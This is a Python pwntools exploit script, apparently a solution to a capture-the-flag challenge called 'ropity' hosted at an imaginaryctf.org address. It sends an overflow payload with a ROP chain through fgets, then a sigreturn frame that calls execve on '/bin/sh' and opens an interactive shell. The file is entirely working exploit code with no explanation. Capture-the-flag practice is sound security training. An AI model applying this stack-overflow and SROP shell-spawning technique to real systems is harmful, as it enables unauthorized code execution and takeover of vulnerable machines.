#!/usr/bin/python3

from pwn import *

exe = ELF('vuln', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x40115A   
        
        c
        ''')
        input()


if args.REMOTE:
    p = remote('ropity.chal.imaginaryctf.org', 1337)
else:
    p = process(exe.path)


syscall = 0x0000000000401177
syscall2 = 0x0000000000401198
ROP = flat(
    0x404018+8, #rbp
    0x401142 , #fgets

)
payload = b"A"*8
payload += ROP
p.sendline(payload)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x4040c0
frame.rsi = 0
frame.rdx = 0
frame.rcx = 0x68732f6e69622f
frame.rip = syscall
frame.rsp = 0x404500

payload = flat(
    syscall2,
    0xf + 8, 
    0x401142,
)
payload += bytes(frame)[8::]
print(len(payload))
p.sendline(payload)
p.interactive()
